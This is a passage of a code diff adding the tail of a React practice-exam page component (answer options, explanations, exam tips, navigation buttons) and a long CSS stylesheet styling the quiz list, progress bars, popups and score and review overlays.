+                    onClick={() => handleOptionClick(displayIdx)}
+                    disabled={examMode ? false : isAnswered}
+                  >
+                    <div className="option-letter">{String.fromCharCode(65 + displayIdx)}</div>
+                    <div className="option-text">{option}</div>
+                  </button>
+                </li>
+              );
+            })}
+          </ul>
+
+          {isAnswered && questionObject && !examMode && (
+            <>
+              <div className={`explanation ${selectedOptionIndex !== null &&
+                answerOrder[realIndex][selectedOptionIndex] ===
+                  questionObject.correctAnswerIndex
+                  ? "correct-explanation"
+                  : "incorrect-explanation"}`}>
+                <strong>
+                  {selectedOptionIndex !== null &&
+                  answerOrder[realIndex][selectedOptionIndex] ===
+                    questionObject.correctAnswerIndex
+                    ? (
+                      <>
+                        <FaCheck className="explanation-icon" />
+                        <span>Correct!</span>
+                      </>
+                    ) : (
+                      <>
+                        <FaTimes className="explanation-icon" />
+                        <span>Incorrect!</span>
+                      </>
+                    )}
+                </strong>
+                <p>{questionObject.explanation}</p>
+              </div>
+              
+              {questionObject.examTip && (
+                <div className="exam-tip">
+                  <strong>
+                    <FaBolt className="exam-tip-icon" />
+                    <span>Exam Tip</span>
+                  </strong>
+                  <p>{questionObject.examTip}</p>
+                </div>
+              )}
+            </>
+          )}
+
+          <div className="bottom-control-bar">
+            <div className="bottom-control-row">
+              <button
+                className="prev-question-btn"
+                onClick={handlePreviousQuestion}
+                disabled={currentQuestionIndex === 0}
+              >
+                <FaChevronLeft className="button-icon" />
+                <span>Previous</span>
+              </button>
+              
+              {currentQuestionIndex === effectiveTotal - 1 ? (
+                <button
+                  className="next-question-btn finish-btn"
+                  onClick={handleNextQuestionButtonClick}
+                >
+                  <FaFlagCheckered className="button-icon" />
+                  <span>Finish Test</span>
+                </button>
+              ) : (
+                <button
+                  className="next-question-btn"
+                  onClick={handleNextQuestionButtonClick}
+                >
+                  <span>Next</span>
+                  <FaChevronRight className="button-icon" />
+                </button>
+              )}
+            </div>
+
+            <div className="bottom-control-row skip-row">
+              <button 
+                className="skip-question-btn" 
+                onClick={handleSkipQuestion}
+              >
+                <FaStepForward className="button-icon" />
+                <span>Skip Question</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+};
+
+export default GlobalTestPage;
+
+/* ==========================================
+   GLOBAL TEST CSS - Modernized & Gamified
+   ========================================== */
+@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap');
+
+:root {
+  --test-bg-dark: #0c0e14;
+  --test-bg-card: #171a23;
+  --test-accent: #6543cc;
+  --test-accent-glow: #8a58fc;
+  --test-accent-secondary: #ff4c8b;
+  --test-success: #2ebb77;
+  --test-error: #ff4e4e;
+  --test-warning: #ffc107;
+  --test-text: #fff;
+  --test-text-secondary: #fff;
+  --test-border: #2a2c3d;
+  --test-input-bg: rgba(0, 0, 0, 0.2);
+  --test-gradient-primary: linear-gradient(135deg, #6543cc, #8a58fc);
+  --test-gradient-secondary: linear-gradient(135deg, #ff4c8b, #ff7950);
+  --test-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+  --test-glow: 0 0 15px rgba(134, 88, 252, 0.5);
+}
+
+/* ==========================================
+   TESTLIST COMPONENT
+   ========================================== */
+
+.testlist-container {
+  font-family: 'Orbitron', 'Roboto', sans-serif;
+  color: var(--test-text);
+  width: 100%;
+  min-height: 100vh;
+  background-color: var(--test-bg-dark);
+  background-image: 
+    radial-gradient(circle at 15% 25%, rgba(26, 20, 64, 0.4) 0%, transparent 45%),
+    radial-gradient(circle at 75% 65%, rgba(42, 26, 89, 0.3) 0%, transparent 40%),
+    repeating-linear-gradient(rgba(0, 0, 0, 0.05) 0px, rgba(0, 0, 0, 0.05) 1px, transparent 1px, transparent 10px);
+  padding: 20px;
+  box-sizing: border-box;
+}
+
+/* TestList Header */
+.testlist-header {
+  background: var(--test-bg-card);
+  border-radius: 15px;
+  margin-bottom: 25px;
+  padding: 25px;
+  box-shadow: var(--test-shadow);
+  border: 1px solid var(--test-border);
+  position: relative;
+  overflow: hidden;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 20px;
+}
+
+.testlist-header::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 4px;
+  background: var(--test-gradient-primary);
+}
+
+.testlist-title-section {
+  flex: 1;
+  min-width: 250px;
+}
+
+.testlist-title {
+  font-size: 28px;
+  margin: 0 0 10px 0;
+  background: var(--test-gradient-primary);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  text-shadow: 0 0 2px rgba(0, 0, 0, 0.5);
+  font-weight: 700;
+}
+
+.testlist-subtitle {
+  font-size: 16px;
+  color: var(--test-text-secondary);
+  margin: 0;
+}
+
+/* Exam Mode Toggle */
+.testlist-mode-toggle {
+  display: flex;
+  align-items: center;
+  background: var(--test-input-bg);
+  border-radius: 12px;
+  padding: 12px 18px;
+  gap: 15px;
+  border: 1px solid var(--test-border);
+}
+
+.testlist-mode-label {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.testlist-mode-icon {
+  color: var(--test-accent);
+  font-size: 18px;
+}
+
+.testlist-toggle {
+  position: relative;
+  display: inline-block;
+  width: 60px;
+  height: 30px;
+}
+
+.testlist-toggle input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+
+.testlist-toggle-slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: var(--test-input-bg);
+  transition: 0.4s;
+  border-radius: 34px;
+  display: flex;
+  align-items: center;
+  padding: 0 5px;
+  border: 1px solid var(--test-border);
+}
+
+.testlist-toggle-slider:before {
+  position: absolute;
+  content: "";
+  height: 22px;
+  width: 22px;
+  left: 4px;
+  bottom: 3px;
+  background-color: var(--test-text);
+  transition: 0.4s;
+  border-radius: 50%;
+  z-index: 1;
+}
+
+.testlist-toggle-text {
+  position: absolute;
+  color: var(--test-text);
+  font-size: 12px;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+  z-index: 0;
+  transition: 0.4s;
+}
+
+.testlist-toggle input:checked + .testlist-toggle-slider {
+  background: var(--test-accent);
+}
+
+.testlist-toggle input:checked + .testlist-toggle-slider:before {
+  transform: translateX(28px);
+  background-color: white;
+}
+
+/* Info Icon & Tooltip */
+.testlist-info-container {
+  position: relative;
+  display: inline-block;
+}
+
+.testlist-info-icon {
+  color: var(--test-text-secondary);
+  cursor: pointer;
+  transition: color 0.2s;
+  font-size: 16px;
+}
+
+.testlist-info-icon:hover {
+  color: var(--test-text);
+}
+
+.testlist-info-tooltip {
+  position: absolute;
+  top: calc(100% + 10px);
+  right: -10px;
+  width: 250px;
+  background: var(--test-bg-card);
+  border: 1px solid var(--test-border);
+  border-radius: 8px;
+  padding: 12px;
+  box-shadow: var(--test-shadow);
+  z-index: 10;
+  font-size: 14px;
+  line-height: 1.5;
+  color: var(--test-text);
+  animation: fadeIn 0.2s ease-in-out;
+}
+
+.testlist-info-tooltip:before {
+  content: '';
+  position: absolute;
+  top: -6px;
+  right: 15px;
+  width: 12px;
+  height: 12px;
+  background: var(--test-bg-card);
+  transform: rotate(45deg);
+  border-top: 1px solid var(--test-border);
+  border-left: 1px solid var(--test-border);
+}
+
+/* Test Cards Grid */
+.testlist-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+  gap: 20px;
+}
+
+/* Test Card */
+.testlist-card {
+  background: var(--test-bg-card);
+  border-radius: 12px;
+  border: 1px solid var(--test-border);
+  overflow: hidden;
+  position: relative;
+  transition: transform 0.3s, box-shadow 0.3s;
+  display: flex;
+  flex-direction: column;
+  box-shadow: var(--test-shadow);
+}
+
+.testlist-card:hover {
+  transform: translateY(-5px);
+  box-shadow: var(--test-shadow), var(--test-glow);
+}
+
+.testlist-card-completed {
+  border-color: var(--test-success);
+}
+
+.testlist-card-progress {
+  border-color: var(--test-accent);
+}
+
+.testlist-card-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 15px 20px;
+  border-bottom: 1px solid var(--test-border);
+  background: rgba(0, 0, 0, 0.2);
+}
+
+.testlist-card-number {
+  font-size: 18px;
+  font-weight: 600;
+  color: var(--test-text);
+}
+
+.testlist-difficulty {
+  font-size: 12px;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-weight: 600;
+}
+
+.testlist-card-content {
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+  flex-grow: 1;
+}
+
+/* Progress Section */
+.testlist-progress-section {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.testlist-progress-text {
+  font-size: 14px;
+  color: var(--test-text-secondary);
+}
+
+.testlist-progress-bar-container {
+  width: 100%;
+  height: 8px;
+  background: var(--test-input-bg);
+  border-radius: 4px;
+  overflow: hidden;
+}
+
+.testlist-progress-bar {
+  height: 100%;
+  background: var(--test-accent);
+  border-radius: 4px;
+  transition: width 0.5s ease;
+}
+
+.testlist-progress-complete {
+  background: var(--test-success);
+}
+
+/* Length Selector */
+.testlist-length-selector {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.testlist-length-label {
+  font-size: 14px;
+  color: var(--test-text-secondary);
+}
+
+.testlist-length-options {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
+}
+
+.testlist-length-option {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 45px;
+  height: 30px;
+  background: var(--test-input-bg);
+  border: 1px solid var(--test-border);
+  border-radius: 5px;
+  cursor: pointer;
+  transition: all 0.2s;
+  position: relative;
+}
+
+.testlist-length-option input {
+  position: absolute;
+  opacity: 0;
+  cursor: pointer;
+  height: 0;
+  width: 0;
+}
+
+.testlist-length-option span {
+  font-size: 14px;
+  color: var(--test-text);
+}
+
+.testlist-length-option:hover {
+  border-color: var(--test-accent);
+  background: rgba(101, 67, 204, 0.1);
+}
+
+.testlist-length-option.selected {
+  background: var(--test-accent);
+  border-color: var(--test-accent-glow);
+}
+
+/* Action Buttons */
+.testlist-card-actions {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-top: auto;
+}
+
+.testlist-card-actions.two-buttons {
+  flex-direction: row;
+  gap: 10px;
+}
+
+.testlist-action-button {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 12px;
+  border-radius: 8px;
+  font-family: inherit;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  border: none;
+  flex: 1;
+}
+
+.testlist-action-icon {
+  font-size: 16px;
+}
+
+.testlist-start-button {
+  background: var(--test-gradient-primary);
+  color: white;
+  box-shadow: 0 4px 12px rgba(101, 67, 204, 0.3);
+}
+
+.testlist-start-button:hover {
+  box-shadow: 0 6px 15px rgba(101, 67, 204, 0.5);
+  transform: translateY(-2px);
+}
+
+.testlist-resume-button {
+  background: var(--test-accent);
+  color: white;
+}
+
+.testlist-resume-button:hover {
+  background: var(--test-accent-glow);
+}
+
+.testlist-restart-button {
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--test-text);
+  border: 1px solid var(--test-border);
+}
+
+.testlist-restart-button:hover {
+  background: rgba(255, 255, 255, 0.15);
+  border-color: var(--test-text-secondary);
+}
+
+.testlist-review-button {
+  background: var(--test-success);
+  color: white;
+}
+
+.testlist-review-button:hover {
+  background: #33cc88;
+}
+
+/* Achievement Badge */
+.testlist-achievement-badge {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  width: 30px;
+  height: 30px;
+  background: var(--test-gradient-secondary);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 0 10px rgba(255, 76, 139, 0.5);
+  z-index: 1;
+}
+
+.testlist-achievement-icon {
+  color: white;
+  font-size: 14px;
+}
+
+/* Popup */
+.testlist-popup-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  backdrop-filter: blur(3px);
+}
+
+.testlist-popup {
+  background: var(--test-bg-card);
+  border-radius: 12px;
+  border: 1px solid var(--test-border);
+  width: 90%;
+  max-width: 450px;
+  box-shadow: var(--test-shadow);
+  animation: popupFadeIn 0.3s ease;
+  overflow: hidden;
+}
+
+.testlist-popup-header {
+  padding: 15px 20px;
+  background: var(--test-input-bg);
+  border-bottom: 1px solid var(--test-border);
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.testlist-popup-icon {
+  color: var(--test-warning);
+  font-size: 20px;
+}
+
+.testlist-popup-header h3 {
+  margin: 0;
+  font-size: 18px;
+}
+
+.testlist-popup-content {
+  padding: 20px;
+}
+
+.testlist-popup-content p {
+  margin: 0 0 10px 0;
+  font-size: 15px;
+  line-height: 1.5;
+  color: var(--test-text-secondary);
+}
+
+.testlist-popup-actions {
+  display: flex;
+  padding: 0 20px 20px;
+  gap: 12px;
+}
+
+.testlist-popup-button {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 12px;
+  border-radius: 8px;
+  font-family: inherit;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  border: none;
+}
+
+.testlist-popup-button-icon {
+  font-size: 16px;
+}
+
+.testlist-popup-confirm {
+  background: var(--test-error);
+  color: white;
+}
+
+.testlist-popup-confirm:hover {
+  background: #ff6b6b;
+}
+
+.testlist-popup-cancel {
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--test-text);
+  border: 1px solid var(--test-border);
+}
+
+.testlist-popup-cancel:hover {
+  background: rgba(255, 255, 255, 0.15);
+}
+
+/* Loading & Error States */
+.testlist-loading,
+.testlist-error,
+.testlist-auth-message {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 60px 20px;
+  background: var(--test-bg-card);
+  border-radius: 15px;
+  border: 1px solid var(--test-border);
+  box-shadow: var(--test-shadow);
+  text-align: center;
+  gap: 20px;
+  margin: 40px auto;
+  max-width: 500px;
+}
+
+.testlist-loading-spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid rgba(134, 88, 252, 0.1);
+  border-radius: 50%;
+  border-top: 4px solid var(--test-accent);
+  animation: spin 1s linear infinite;
+}
+
+.testlist-error-icon,
+.testlist-auth-icon {
+  font-size: 40px;
+  color: var(--test-error);
+}
+
+.testlist-auth-icon {
+  color: var(--test-accent);
+}
+
+.testlist-retry-button,
+.testlist-login-button {
+  background: var(--test-accent);
+  color: white;
+  border: none;
+  padding: 12px 25px;
+  border-radius: 8px;
+  font-family: inherit;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.testlist-retry-button:hover,
+.testlist-login-button:hover {
+  background: var(--test-accent-glow);
+  transform: translateY(-2px);
+}
+
+/* Animations */
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes popupFadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* ==========================================
+   GLOBAL TEST PAGE COMPONENT 
+   ========================================== */
+
+.aplus-test-container {
+  font-family: 'Orbitron', 'Roboto', sans-serif;
+  color: var(--test-text);
+  width: 100%;
+  min-height: 100vh;
+  background-color: var(--test-bg-dark);
+  background-image: 
+    radial-gradient(circle at 15% 25%, rgba(26, 20, 64, 0.4) 0%, transparent 45%),
+    radial-gradient(circle at 75% 65%, rgba(42, 26, 89, 0.3) 0%, transparent 40%),
+    repeating-linear-gradient(rgba(0, 0, 0, 0.05) 0px, rgba(0, 0, 0, 0.05) 1px, transparent 1px, transparent 10px);
+  padding: 20px;
+  box-sizing: border-box;
+  position: relative;
+}
+
+/* Test Page Header */
+.aplus-title {
+  font-size: 28px;
+  margin: 15px 0;
+  text-align: center;
+  background: var(--test-gradient-primary);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  text-shadow: 0 0 2px rgba(0, 0, 0, 0.5);
+  font-weight: 700;
+}
+
+/* Top Navigation Bar */
+.top-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: var(--test-bg-card);
+  border-radius: 12px;
+  padding: 12px 20px;
+  margin-bottom: 20px;
+  border: 1px solid var(--test-border);
+  box-shadow: var(--test-shadow);
+}
+
+.avatar-section-test {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.avatar-image {
+  width: 45px;
+  height: 45px;
+  border-radius: 50%;
+  background-size: cover;
+  background-position: center;
+  border: 2px solid var(--test-accent);
+  box-shadow: 0 0 8px rgba(134, 88, 252, 0.5);
+}
+
+.avatar-level {
+  font-size: 12px;
+  font-weight: 600;
+  background: var(--test-accent);
+  color: white;
+  padding: 3px 8px;
+  border-radius: 12px;
+}
+
+.xp-level-display,
+.coins-display {
+  font-size: 14px;
+  padding: 6px 12px;
+  background: rgba(0, 0, 0, 0.2);
+  border-radius: 6px;
+  border: 1px solid var(--test-border);
+}
+
+.coins-display {
+  color: #ffd700;
+}
+
+/* Upper Control Bar */
+.upper-control-bar {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 15px;
+  flex-wrap: wrap;
+  gap: 10px;
+}
+
+.restart-test-btn,
+.back-btn {
+  background: var(--test-bg-card);
+  color: var(--test-text);
+  border: 1px solid var(--test-border);
+  padding: 8px 15px;
+  border-radius: 6px;
+  font-family: inherit;
+  font-size: 14px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.restart-test-btn:hover,
+.back-btn:hover {
+  background: rgba(255, 255, 255, 0.05);
+  color: var(--test-accent);
+}
+
+/* Top Control Bar with QuestionDropdown */
+.top-control-bar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 20px;
+  background: var(--test-bg-card);
+  border-radius: 10px;
+  padding: 10px 15px;
+  border: 1px solid var(--test-border);
+  flex-wrap: wrap;
+  gap: 10px;
+}
+
+.flag-btn,
+.finish-test-btn {
+  background: rgba(255, 255, 255, 0.05);
+  color: var(--test-text);
+  border: 1px solid var(--test-border);
+  padding: 8px 15px;
+  border-radius: 6px;
+  font-family: inherit;
+  font-size: 14px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.flag-btn:hover {
+  color: var(--test-warning);
+  border-color: var(--test-warning);
+}
+
+.finish-test-btn {
+  background: var(--test-error);
+  color: white;
+  border: none;
+}
+
+.finish-test-btn:hover {
+  background: #ff6b6b;
+}
+
+/* Question Dropdown */
+.question-dropdown {
+  position: relative;
+  min-width: 150px;
+}
+
+.dropdown-button {
+  background: var(--test-accent);
+  color: white;
+  border: none;
+  padding: 10px 15px;
+  border-radius: 6px;
+  font-family: inherit;
+  font-size: 14px;
+  cursor: pointer;
+  width: 100%;
+  text-align: center;
+  font-weight: 600;
+}
+
+.dropdown-content {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  background: var(--test-bg-card);
+  border: 1px solid var(--test-border);
+  border-radius: 8px;
+  box-shadow: var(--test-shadow);
+  width: 200px;
+  max-height: 300px;
+  overflow-y: auto;
+  z-index: 100;
+  margin-top: 5px;
+}
+
+.dropdown-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 15px;
+  border-bottom: 1px solid var(--test-border);
+  background: none;
+  border-left: none;
+  border-right: none;
+  border-top: none;
+  width: 100%;
+  text-align: left;
+  color: var(--test-text);
+  font-family: inherit;
+  font-size: 14px;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.dropdown-item:last-child {
+  border-bottom: none;
+}
+
+.dropdown-item:hover {
+  background: rgba(255, 255, 255, 0.05);
+}
+
+.status-indicators {
+  display: flex;
+  gap: 5px;
+}
+
+.answer-indicator {
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 12px;
+  font-weight: bold;
+}
+
+.answer-indicator.correct {
+  background: var(--test-success);
+  color: white;
+}
+
+.answer-indicator.incorrect {
+  background: var(--test-error);
+  color: white;
+}
+
+.flag-indicator {
+  font-size: 14px;
+}
+
+/* Progress Bar */
+.progress-container {
+  height: 24px;
+  background: var(--test-input-bg);
+  border-radius: 12px;
+  overflow: hidden;
+  margin-bottom: 20px;
+  border: 1px solid var(--test-border);
+  box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2);
+}
+
+.progress-fill {
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 14px;
+  font-weight: 600;
+  transition: width 0.5s ease;
+  background: var(--test-accent);
+  text-shadow: 0 0 2px rgba(0, 0, 0, 0.5);
+  position: relative;
+  min-width: 100px;
+}
+
+/* Question Card */
+.question-card {
+  background: var(--test-bg-card);
+  border-radius: 12px;
+  border: 1px solid var(--test-border);
+  padding: 25px;
+  box-shadow: var(--test-shadow);
+  margin-bottom: 20px;
+  animation: fadeIn 0.3s ease;
+}
+
+.question-text {
+  font-size: 20px;
+  line-height: 1.5;
+  margin-bottom: 25px;
+  padding-bottom: 15px;
+  border-bottom: 1px solid var(--test-border);
+  color: var(--test-text);
+  font-family: 'Open Sans', sans-serif;
+}
+
+/* Options List */
+.options-list {
+  list-style-type: none;
+  padding: 0;
+  margin: 0 0 25px 0;
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+}
+
+.option-item {
+  width: 100%;
+}
+
+.option-button {
+  width: 100%;
+  text-align: left;
+  background: var(--test-input-bg);
+  border: 1px solid var(--test-border);
+  border-radius: 8px;
+  padding: 15px;
+  font-family: inherit;
+  color: var(--test-text);
+  font-size: 16px;
+  cursor: pointer;
+  transition: all 0.2s;
+  position: relative;
+  overflow: hidden;
+  line-height: 1.5;
+}
+
+.option-button:hover:not(:disabled) {
+  background: rgba(255, 255, 255, 0.05);
+  transform: translateX(5px);
+}
+
+.option-button:disabled {
+  cursor: default;
+}
+
+.correct-option {
+  background: rgba(46, 187, 119, 0.15) !important;
+  border-color: var(--test-success) !important;
+}
+
+.incorrect-option {
+  background: rgba(255, 78, 78, 0.15) !important;
+  border-color: var(--test-error) !important;
+}
+
+.chosen-option {
+  background: rgba(101, 67, 204, 0.15) !important;
+  border-color: var(--test-accent) !important;
+}
+
+/* Explanation Section */
+.explanation {
+  background: rgba(0, 0, 0, 0.2);
+  border: 1px solid var(--test-border);
+  border-radius: 8px;
+  padding: 15px;
+  margin-bottom: 25px;
+  animation: fadeIn 0.3s ease;
+  font-family: 'Open Sans', sans-serif
+}
+
+.explanation strong {
+  display: block;
+  margin-bottom: 10px;
+  font-size: 17px;
+  color: var(--test-success);
+  font-family: 'Open Sans', sans-serif
+}
+
+.explanation strong:contains("Incorrect") {
+  color: var(--test-error);
+}
+
+.explanation p {
+  margin: 0;
+  font-size: 17px;
+  line-height: 1.6;
+  color: var(--test-text-secondary);
+  font-family: 'Open Sans', sans-serif
+}
+
+/* Bottom Control Bar */
+.bottom-control-bar {
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+}
+
+.bottom-control-row {
+  display: flex;
+  justify-content: space-between;
+  gap: 15px;
+}
+
+.skip-row {
+  justify-content: center;
+}
+
+.prev-question-btn,
+.next-question-btn,
+.skip-question-btn {
+  padding: 12px 20px;
+  border-radius: 8px;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  flex: 1;
+  max-width: 200px;
+}
+
+.prev-question-btn {
+  background: rgba(255, 255, 255, 0.05);
+  color: var(--test-text);
+  border: 1px solid var(--test-border);
+}
+
+.prev-question-btn:hover:not(:disabled) {
+  background: rgba(255, 255, 255, 0.1);
+}
+
+.prev-question-btn:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+.next-question-btn {
+  background: var(--test-gradient-primary);
+  color: white;
+  border: none;
+  box-shadow: 0 4px 15px rgba(101, 67, 204, 0.3);
+}
+
+.next-question-btn:hover {
+  box-shadow: 0 6px 20px rgba(101, 67, 204, 0.4);
+  transform: translateY(-2px);
+}
+
+.skip-question-btn {
+  background: var(--test-bg-card);
+  color: var(--test-text-secondary);
+  border: 1px solid var(--test-border);
+  max-width: 150px;
+}
+
+.skip-question-btn:hover {
+  color: var(--test-warning);
+  border-color: var(--test-warning);
+}
+
+/* Confirm Popup Styles */
+.confirm-popup-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  backdrop-filter: blur(3px);
+}
+
+.confirm-popup-content {
+  background: var(--test-bg-card);
+  border-radius: 12px;
+  border: 1px solid var(--test-border);
+  width: 90%;
+  max-width: 400px;
+  padding: 25px;
+  box-shadow: var(--test-shadow);
+  animation: popupFadeIn 0.3s ease;
+}
+
+.confirm-popup-content p {
+  margin: 0 0 20px 0;
+  font-size: 16px;
+  line-height: 1.5;
+}
+
+.confirm-popup-buttons {
+  display: flex;
+  justify-content: center;
+  gap: 15px;
+}
+
+.confirm-popup-yes,
+.confirm-popup-no,
+.confirm-popup-ok {
+  padding: 10px 20px;
+  border-radius: 8px;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  min-width: 100px;
+  border: none;
+}
+
+.confirm-popup-yes {
+  background: var(--test-error);
+  color: white;
+}
+
+.confirm-popup-yes:hover {
+  background: #ff6b6b;
+}
+
+.confirm-popup-no,
+.confirm-popup-ok {
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--test-text);
+  border: 1px solid var(--test-border);
+}
+
+.confirm-popup-no:hover,
+.confirm-popup-ok:hover {
+  background: rgba(255, 255, 255, 0.15);
+}
+
+/* Score Overlay */
+.score-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.8);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 100;
+  backdrop-filter: blur(5px);
+}
+
+.score-content {
+  background: var(--test-bg-card);
+  border-radius: 15px;
+  border: 1px solid var(--test-border);
+  padding: 30px;
+  width: 90%;
+  max-width: 500px;
+  text-align: center;
+  box-shadow: var(--test-shadow);
+  animation: fadeInUp 0.5s ease;
+  position: relative;
+}
+
+.score-title {
+  font-size: 28px;
+  margin: 0 0 20px 0;
+  background: var(--test-gradient-primary);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  font-weight: 700;
+}
+
+.score-details {
+  font-size: 18px;
+  margin-bottom: 30px;
+  color: var(--test-text);
+}
+
+.overlay-buttons {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 15px;
+}
+
+.restart-button,
+.review-button,
+.back-btn,
+.next-test-button {
+  padding: 12px 20px;
+  border-radius: 8px;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  min-width: 120px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  border: none;
+}
+
+.restart-button {
+  background: var(--test-accent);
+  color: white;
+}
+
+.restart-button:hover {
+  background: var(--test-accent-glow);
+  transform: translateY(-2px);
+}
+
+.review-button {
+  background: var(--test-success);
+  color: white;
+}
+
+.review-button:hover {
+  background: #33cc88;
+  transform: translateY(-2px);
+}
+
+.back-btn {
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--test-text);
+  border: 1px solid var(--test-border);
+}
+
+.back-btn:hover {
+  background: rgba(255, 255, 255, 0.15);
+}
+
+.next-test-button {
+  background: var(--test-gradient-secondary);
+  color: white;
+}
+
+.next-test-button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 15px rgba(255, 76, 139, 0.3);
+}
+
+/* Length Selection in Score Overlay */
+.length-selection {
+  background: rgba(0, 0, 0, 0.2);
+  border-radius: 8px;
+  padding: 15px;
+  margin: 20px 0;
+  border: 1px solid var(--test-border);
+}
+
+.length-selection p {
+  margin-top: 0;
+  margin-bottom: 10px;
+  font-size: 16px;
+  color: var(--test-text-secondary);
+}
+
+.length-selection label {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  margin-right: 15px;
+  cursor: pointer;
+  font-size: 14px;
+}
+
+.length-selection input[type="radio"] {
+  accent-color: var(--test-accent);
+  cursor: pointer;
+}
+
+/* Review Mode */
+.review-overlay {
+  z-index: 101;
+}
+
+.review-content {
+  max-width: 800px;
+  max-height: 80vh;
+  width: 90%;
+  overflow-y: auto;
+  scrollbar-width: thin;
+  scrollbar-color: var(--test-accent) var(--test-bg-dark);
+  padding: 30px;
+}
+
+.review-content::-webkit-scrollbar {
+  width: 8px;
+}
+
+.review-content::-webkit-scrollbar-track {
+  background: var(--test-bg-dark);
+  border-radius: 4px;
+}
+
+.review-content::-webkit-scrollbar-thumb {
+  background-color: var(--test-accent);
+  border-radius: 4px;
+}
+
+.back-to-list-btn,
+.close-review-x {
+  position: absolute;
+  top: 15px;
+  right: 15px;
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--test-text-secondary);
+  border: 1px solid var(--test-border);
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  transition: all 0.2s;
+  font-size: 14px;
+}
+
+.back-to-list-btn {
+  width: auto;
+  height: auto;
+  border-radius: 8px;
+  padding: 8px 12px;
+  font-size: 14px;
+}
+
+.back-to-list-btn:hover,
+.close-review-x:hover {
